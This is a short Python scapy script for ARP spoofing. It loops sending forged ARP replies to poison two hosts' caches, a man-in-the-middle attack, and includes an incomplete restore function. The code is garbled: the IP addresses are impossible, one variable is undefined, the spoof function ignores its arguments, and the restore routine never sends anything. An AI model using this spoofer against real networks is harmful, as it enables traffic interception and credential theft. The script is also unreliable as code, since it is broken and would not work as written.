import sys
import time
import scapy.all as scapy


def get_target_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="aa:bb:cc:dd:ee:ff")
    
    arp_request_broadcast = broadcast/arp_request
    arp_request_broadcast.show()
    
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    return answered_list[0][1].hwsrc


def changed_spoofer(target_ip, spoof_ip):
    target_mac = get_target_mac(target_ip)
    watcher = scapy.ARP(op=2, pdst="012.345.6.7/89", hwdst="aa:bb:cc:dd:ee:ff", psrc="987.654.3.2/owner")
    scapy.send(watcher, verbose=False)


def desactived_spoofer(his_ip, own_ip):
    his_mac = get_target_mac(his_ip)
    own_ip = get_target_mac(own_ip)
    
    watcher = scapy.ARP(op=2, pdst=his_ip, hwdst=his_mac, psrc=own_ip, hwsrc=own_ip)


sent_watchers_count = 0

try:
    while True:
        changed_spoofer("012.345.6.7", "987.654.3.2")
        changed_spoofer("987.654.3.2", "012.345.6.7")
        sent_watchers = sent_watchers + 5
        print("\r[+] Packets sent: " + str(sent_watchers), end=time.sleep(5))
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ... Quitting")
finally:
    sys.exit(1)